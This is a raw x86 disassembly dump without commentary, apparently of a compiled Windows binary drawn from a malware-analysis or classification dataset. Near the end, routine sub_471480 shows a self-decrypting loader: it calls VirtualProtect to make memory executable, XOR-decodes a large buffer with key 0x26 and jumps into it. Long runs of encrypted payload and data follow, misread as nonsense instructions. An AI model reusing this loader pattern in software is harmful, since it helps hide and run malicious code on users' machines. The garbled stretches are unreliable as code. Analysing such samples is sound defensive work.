mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x1e4 ]
call [ ebx + 0x1e0 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_46b6b0
inc [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x20c ]
call [ ebx + 0x208 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_46b65c
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x204 ]
call [ ebx + 0x200 ]
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_46b350
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
lea ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x14 ]
call sub_46b350
inc [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
jmp r-xdata
mov [ ebp - 0x1d ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_46b32c
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0x1e ]
mov [ ebp - 0x1e ] al
lea ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_40800c
mov edx eax
mov eax [ ebp - 0x14 ]
call sub_46b32c
inc [ ebp - 0x10 ]
jmp r-xdata
mov [ ebp - 0x1d ] 0x2
jmp r-xdata
sub eax 0x35
je r-xdata
cmp [ ebp - 0x1d ] 0x1
jne r-xdata
jmp r-xdata
cmp [ ebx + 0x1fa ] 0x0
je r-xdata
cmp [ ebx + 0x1f2 ] 0x0
je r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x1fc ]
call [ ebx + 0x1f8 ]
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x30 ]
push eax
mov ecx [ ebp - 0x18 ]
mov edx ebx
mov eax [ ebx + 0x1f4 ]
call [ ebx + 0x1f0 ]
sub_4709ac
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_403878#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x1
mov al [ ebx + 0x100 ]
mov [ ebp - 0xa ] al
lea ecx [ ebp - 0x10 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4041b8
mov esi eax
test esi esi
jle r-xdata
mov al [ ebp - 0xa ]
cmp al [ ebx + 0x100 ]
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470b54
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403f1c
retn
mov al [ ebp - 0xa ]
mov [ ebx + 0x100 ] al
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
lea ecx [ ebp - 0x18 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
movzx eax [ eax + edx - 0x1 ]
cmp eax 0x6f
jg r-xdata
lea ecx [ ebp - 0x14 ]
mov edx 0x3
mov eax [ ebx + 0x2c8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_4041b8
test eax eax
jle r-xdata
sub eax 0x73
je r-xdata
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
sub eax 0x4
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
sub eax 0x2b
je r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
jmp r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
mov al [ r-xdata ]
or al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
jmp r-xdata
mov [ ebp - 0x9 ] 0x2
jmp r-xdata
sub eax 0x3c
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
jmp r-xdata
mov al [ r-xdata ]
not eax
and al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
jmp r-xdata
mov al [ r-xdata ]
or al [ ebp - 0xa ]
mov [ ebp - 0xa ] al
jmp r-xdata
sub_470b70
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push j_sub_403878#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4041b8
test eax eax
jle r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x21
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470bd2
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov bl 0x1
sub al 0x2
je r-xdata
sub al 0x3
je r-xdata
sub al 0x5
je r-xdata
sub_470bd8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_468a0c
mov [ edi + 0x68 ] esi
mov [ edi + 0xf ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_470c1c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_470c86
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
lea eax [ ebp - 0x4 ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebx + 0x68 ]
mov esi [ eax ]
call [ esi + 0x70 ]
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x6c ]
call sub_403f4c
mov eax [ ebx + 0x68 ]
push eax
push sub_46bec4
mov eax ebx
call sub_468c60
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x68 ]
mov ebx [ eax ]
call [ ebx + 0x48 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470c8d
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_470ca0
push ebp
mov ebp esp
push ecx
push ebx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
call [ ebx + 0x1c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_470cd8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_46badc
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46badc
mov ecx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_46bad4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx edi
mov edx esi
call sub_46bad4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_470d24
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
dec eax
cmp eax [ ebp - 0x4 ]
jne r-xdata
lea edx [ esi + ebx ]
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_46badc
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_46badc
pop edx
call sub_470ca0
pop ecx
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46badc
mov edi eax
jmp r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_470cd8
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_46badc
mov edx edi
call sub_470ca0
pop ecx
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_46badc
mov edx edi
call sub_470ca0
pop ecx
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx esi
mov eax ebx
call sub_470cd8
pop ecx
inc ebx
dec esi
mov eax esi
sub eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
sub edx ebx
cmp eax edx
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_470d24
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_470d24
pop ecx
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
sub_470e4c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_414e60
test eax eax
jle r-xdata
pop ecx
pop ebp
retn
push ebp
mov eax [ ebp - 0x4 ]
call sub_414e60
mov edx eax
dec edx
xor eax eax
call sub_470d24
pop ecx
sub_470e78
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403878#4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470ee5
retn
mov eax rw-data
mov ecx 0x4
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
mov ecx 0xa
mov edx [ r-xdata ]
call sub_404980
mov eax rw-data
mov ecx 0xd
mov edx [ r-xdata ]
call sub_404980
sub_470ef0
cmp al 0xf
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
cmova eax [ eax ]
clc
cmova eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
0xf000470f 0x0
sub_470f17
add [ eax - 0x13ffb97f ] ah
mov cl 0x41
add [ eax + 0x33 ] bh
inc eax
add [ eax - 0x55 ] al
inc ecx
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov al [ 0x4685 ]
dec eax
inc ecx
add ah dh
lodsd [ esi ]
inc ecx
add [ edi + eax * 2 ] bl
inc ecx
add ah cl
scasb [ edi ]
inc ecx
add ah ah
je r-xdata
insd
inc esi
add [ eax ] cl
jpo r-xdata
add ah bl
scasb [ edi ]
inc ecx
add ah dl
scasd [ edi ]
inc ecx
add [ edx + esi * 4 ] al
inc ecx
add ah ch
scasb [ edi ]
inc ecx
add ah ah
scasb [ edi ]
inc ecx
add [ edx + esi * 4 ] cl
inc ecx
add [ eax - 0x77ffb8f0 ] cl
cmp [ esi ] al
sar [ eax ] 0x46
add al dh
cmp [ esi ] al
sub [ esi + 0x46 ] ch
add [ esp + esi * 2 + 0x6b040046 ] ch
inc esi
add [ ebx + ebp * 2 + 0x7bcc0046 ] ch
inc esi
add [ ebp + edi * 2 + 0x6c800046 ] bl
inc esi
add al dh
add [ eax + edx + 0xe80040 ] ch
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] edx
inc esi
imul ebp [ esi + 0x67 ] 0xff87265
inc edi
add [ edi ] al
add [ eax + 0x6e ] cl
inc esi
add al dl
outsb
inc esi
add [ eax + 0x6e ] dh
inc esi
add [ edi + ebp * 2 ] dh
inc esi
add al ah
jno r-xdata
ror [ ebx + 0x74bde8c6 ] cl
jb r-xdata
or [ ecx + ecx * 2 + 0x64 ] edx
inc esi
imul ebp [ esi + 0x67 ] 0xf3c7265
inc edi
add al al
add [ esi ] 0x17
cmova eax [ eax ]
pop es
add al al
je r-xdata
add [ ebx + 0x74db84c6 ] cl
psubsb mm4 mm3
and edi ecx
jmp [ edi + ecx * 4 + 0x5 ]
lodsb [ esi ]
adc [ eax ] al
int3
add [ ebp + esi * 2 + 0x79200046 ] al
inc esi
add [ eax - 0x47ffb987 ] al
ja r-xdata
add [ eax ] cl
dec ecx
inc esi
imul ebp [ esi + 0x67 ] 0x37265
lodsb [ esi ]
adc [ eax ] al
call 0xffffffffe9461021
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x51050014 ] al
jne r-xdata
inc esi
add [ edi ] dl
add al ch
test [ esi ] eax
add [ esi - 0x7a37ffba ] al
inc esi
add [ ebx + eax * 4 - 0x7af3ffba ] dl
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
sub_4710cc
push ebx
push esi
mov esi edx
mov ebx eax
push [ ebx + 0xe8 ]
push r-xdata
push [ ebx + 0xc8 ]
mov eax esi
mov edx 0x3
call sub_404278
pop esi
pop ebx
retn
sub_4710f7
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
xor eax eax
push ebp
push sub_4711b2
push [ fs : eax ]
mov [ fs : eax ] esp
or ecx 0xffffffff
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_46271c
mov ebx eax
test ebx ebx
je r-xdata
lea eax [ esi + 0xe8 ]
mov edx [ ebp - 0x4 ]
call sub_403f4c
mov eax [ ebp - 0x4 ]
call sub_4041b8
cmp ebx eax
jge r-xdata
lea eax [ esi + 0xe8 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404418
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4041b8
mov ecx eax
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_404418
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x88 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4711b9
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
sub_4711c3
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4711f1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4711f8
retn
sub_471208
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x47
add [ ebx + edx + 0x47 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x28004714 ] ah
add eax [ eax ]
add al ah
das
inc ebp
add ah ch
mov cl 0x41
add [ eax ] al
pop esp
inc ebp
add [ ebp + ebx * 2 + 0x33800045 ] dh
inc eax
add [ eax ] ah
add [ ebp ] 0xbc
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esi + ebx * 2 ] bl
inc ebp
add [ eax + 0x47 ] bh
inc esp
add [ ebx + 0x471c0045 ] cl
inc ecx
add ah bl
pop edi
inc ebp
add [ eax ] bl
pushad
inc ebp
add [ ecx ] ah
inc ebp
add [ edx + edx * 8 + 0x43 ] ch
add [ edx + esi * 4 ] al
inc ecx
add [ ecx + ebp * 2 - 0x511bffbb ] bl
inc ecx
add [ 0x5a740045 ] bh
inc ebp
add [ edx + eax * 2 + 0x47a80044 ] cl
inc esp
add ah dh
inc esi
inc esp
add al cl
mov [ ebx ] sub_443d08
jl r-xdata
fadd [ ecx + 0xffc0045 ]
inc esp
add [ esp + edi + 0x44 ] dh
inc ebp
add [ eax + 0x3a ] al
inc esp
add [ eax ] dl
mov [ ebx ] sub_43c714
jo r-xdata
or [ ebx ] al
add [ eax ] al
add al 0x0
cld
add al [ eax ]
add [ ecx ] al
add [ ebx ] cl
push edx
popad
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ esi ] al
push eax
popad
outsb
insb
xor [ ebx + eax ] eax
add [ eax ] al
add eax [ eax ]
or eax [ ecx + 0x63 ]
je r-xdata
inc esp
add al dh
cmp [ eax + eax - 0x1c ] al
popfd
inc ebp
add [ eax + 0x53 ] ch
inc ebp
add [ eax ] bl
push esi
inc ebp
add ah al
mov es [ ebp ]
add [ edi + 0x45 ] bl
add [ edi + ebx * 2 + 0x45 ] bh
add ah al
mov eax [ 0x5c380045 ]
inc ebp
add al cl
pushfd
inc ebp
add [ eax + 0x7c004583 ] ch
sahf
inc ebp
dec ebp
inc ebp
add [ eax ] dh
test [ ebx ] r-xdata
mov eax cs
inc ebx
add al ah
rol [ ebx ] cl
imul eax [ fs : ebp ] sub_456830
sbb ch dl
inc ebx
add ah bl
imul eax [ ebp ] sub_43f7b4
xchg esp eax
cmp al [ eax + eax + 0x50 ]
cmp eax [ eax + eax + 0x4c ]
inc esp
add [ ebx + edi ] dh
inc esp
add [ ecx + ebx * 2 + 0x45 ] dh
add [ eax + 0x4570 ] al
adc [ eax + eax + 0x44 ] eax
jge r-xdata
jb r-xdata
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0xc31676f
add eax [ eax ]
add [ 0x6f430c00 ] al
insb
outsd
jb r-xdata
jne r-xdata
push cs
push edx
jo r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30831
add [ eax + eax ] al
add [ eax + 0x69 ] ah
cmp [ ebp + eax * 2 ] bl
enter 0x459c 0x0
test al 0x83
inc ebp
add [ esi + ebx * 4 + 0x45 ] bh
add [ eax + eax * 4 + 0x7f600045 ] ah
inc ebp
add [ eax - 0x63ffbbef ] bl
adc [ eax + eax - 0x24 ] eax
add [ ebp ] r-xdata
je r-xdata
into
inc edx
add [ edi + ecx * 4 ] ah
inc esp
add [ edx ] al
inc edx
add [ ebp + edx * 4 + 0x42 ] bl
and [ ebx ] al
add [ eax ] al
or al [ eax ]
push es
dec ecx
dec ecx
push edx
inc ebx
xor [ ebx + eax ] esp
add [ eax ] al
or eax [ eax ]
or ecx [ ecx + 0x64 ]
dec esp
popad
insb
outsd
xor [ si ] ebx
imul esp [ ecx + 0x6c ] 0x1031676f
add eax [ eax ]
add [ esi ] al
add [ edx ] dl
dec edi
jo r-xdata
push es
push esp
inc esi
outsd
jb r-xdata
shl [ esp + edx + 0x47 ] 0x0
pop es
add eax [ eax ]
add [ ecx ] cl
add [ ecx ] cl
dec ecx
inc esi
imul ebp [ esi + 0x67 ] 0x20317265
add eax [ eax ]
add [ edx ] cl
add [ esi ] al
inc esp
inc ebp
add [ eax + eax ] cl
sub al 0x14
inc edi
add al bh
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc ebx
push 0x426b6365
outsd
js r-xdata
add al dl
mov [ ebp ] al
mov ah 0x4d
inc esp
xor [ eax + 0x12 ] edx
inc edi
add [ eax ] ch
xor [ ebp ] eax
pop esi
add [ 0x74696e55 ] al
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
push 0x5a33
push ebx
call VirtualProtect
xor eax eax
xor [ eax + eax ] ecx
mov eax 0x8000434d
fld [ edx ]
in al dx
jne r-xdata
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x1431676f
add eax [ eax ]
add [ edi ] al
add [ eax + edx * 2 ] cl
jb r-xdata
nop
push r-xdata
call sub_471480
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
cmpsb [ esi ] [ edi ]
and [ esi ] 0x26
movsd [ edi ] es : [ esi ]
out 0x2e al
jbe r-xdata
nop
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
nop
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
nop
xor dl 0x26
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x5a34
jne r-xdata
nop
add ebx 0x2d45
mov [ ebp - 0x4 ] ebx
nop
jmp [ ebp - 0x4 ]
nop
test ebx ebx
je r-xdata
xor [ esi ] eax
push esp
inc esi
outsd
jb r-xdata
add [ eax - 0x77ffbcdd ] bl
xchg edi eax
inc edx
add [ esp + ebx * 4 ] dh
inc edx
add al dh
push cs
inc edi
add [ edx + 0x46 ] ch
add [ ecx + ecx * 2 ] bl
inc esi
add [ ebx + 0x471464c0 ] cl
mov [ 0xffffffff955c0042 ] al
inc edx
outsb
je r-xdata
add [ ecx - 0x6f03a3 ] cl
cld
nop
nop
push ebx
retn 0x67cf
outsd
inc esp
bound esi [ gs : ebp + 0x67 ]
imul esp [ ecx + 0x6c ] 0x1831676f
add eax [ eax ]
add [ eax ] cl
add [ eax ] dl
push eax
popad
push ebx
je r-xdata
add [ edi ] al
jo r-xdata
inc edx
add ah ch
imul esp [ ecx + 0x6c ] 0x1c31676f
sub_471480
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx [ ebp + 0x8 ]
nop
nop
test ebx ebx
je r-xdata
nop
push r-xdata
call sub_471480
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xad
cmpsb [ esi ] [ edi ]
and [ esi ] 0x26
movsd [ edi ] es : [ esi ]
out 0x2e al
jbe r-xdata
nop
nop
lea eax [ ebp - 0x8 ]
push eax
push 0x40
push 0x5a33
push ebx
call VirtualProtect
xor eax eax
add [ ecx - 0x6f03a3 ] cl
cld
nop
nop
push ebx
retn 0x67cf
nop
nop
lea edx [ eax + ebx ]
mov dl [ edx ]
nop
xor dl 0x26
lea ecx [ eax + ebx ]
mov [ ecx ] dl
nop
nop
inc eax
cmp eax 0x5a34
jne r-xdata
nop
add ebx 0x2d45
mov [ ebp - 0x4 ] ebx
nop
jmp [ ebp - 0x4 ]
sub_471722
push esi
ja r-xdata
fxch st6
and [ edx + 0x26 ] ch
fldenv [ es : eax + 0x2626269a ]
mov dh 0xb6
mov dh 0xb6
mov dh 0x66
iretd
xchg ebx eax
add eax 0xb6b62626
mov dh 0xb6
mov dh 0xb6
mov dh 0x7f
dec esp
jle r-xdata
fnstenv [ eax + 0x32 ]
scasd [ edi ]
fwait
fcmovnu st1
fxch st7
inc eax
add eax 0xb6b62626
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
loopne r-xdata
movsd [ edi ] ss : [ esi ]
xor [ eax ] cl
mov dh 0x7f
push edx
stosb [ edi ]
add al [ esi + 0x77262624 ]
jbe r-xdata
adc eax 0xda7bad4e
add dh [ edx ]
scasd [ edi ]
push 0x2
push cs
stosd [ edi ]
bound eax [ edx ]
push 0x76
jno r-xdata
stosd [ edi ]
loopne r-xdata
xchg ebp eax
cmp eax 0xe6152626
iretd
dec esp
push es
jno r-xdata
jpo r-xdata
jecxz r-xdata
adc eax 0x44acfe6
out dx eax
in eax 0xb6
mov dh 0xb6
mov dh 0xb6
mov [ 0x3f6fcfe6 ] eax
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0x7f
iretd
iretd
mov [ 0xffffffffd9d9dbf2 ] eax
jbe r-xdata
stosd [ edi ]
lodsd [ esi ]
cmp eax 0x6ecff725
fstpnce st1
fnstenv [ esi - 0x4949494a ]
mov dh 0xb6
fst [ esi + 0x26262722 ]
lodsd [ esi ]
scasb [ edi ]
daa
fst [ es : edx + 0x2 ]
xor ch [ edi - 0x54f1fd96 ]
cdq
sub [ esi ] esp
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
dec esi
daa
cmpsb [ es : esi ] [ edi ]
scasd [ edi ]
jpo r-xdata
movsd [ edi ] es : [ esi ]
loop r-xdata
sub [ ebx + 0x26263d95 ] esp
fnstenv [ ecx + 0x262626de ]
iretd
stosd [ edi ]
bound eax [ edx ]
push ds
jbe r-xdata
pop edx
add bh [ edx ]
iretd
movsd [ edi ] [ esi ]
sub_4718b7
xchg ebp eax
mov dh 0xb6
mov dh 0xb6
mov dh 0xa5
loop r-xdata
0x2626
mov [ 0xffffffffda68cfe6 ] eax
fstpnce st1
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
jpo r-xdata
inc eax
scasd [ edi ]
jpo r-xdata
jge r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jg r-xdata
lodsd [ esi ]
inc [ eax - 0x51 ]
arpl si si
iretd
mov dh 0xb6
mov dh 0x7f
iretd
and eax 0xb6262600
mov dh 0xaf
and dh cl
adc esi [ edi ]
dec esi
dec ebp
jo r-xdata
outsd
aas
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
push ss
jne r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov al [ 0x262626ca ]
iretd
sub_4718f2
salc
mov dh 0xb6
mov dh 0xb6
inc eax
scasd [ edi ]
jpo r-xdata
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
mov dh 0xb6
jg r-xdata
lodsd [ esi ]
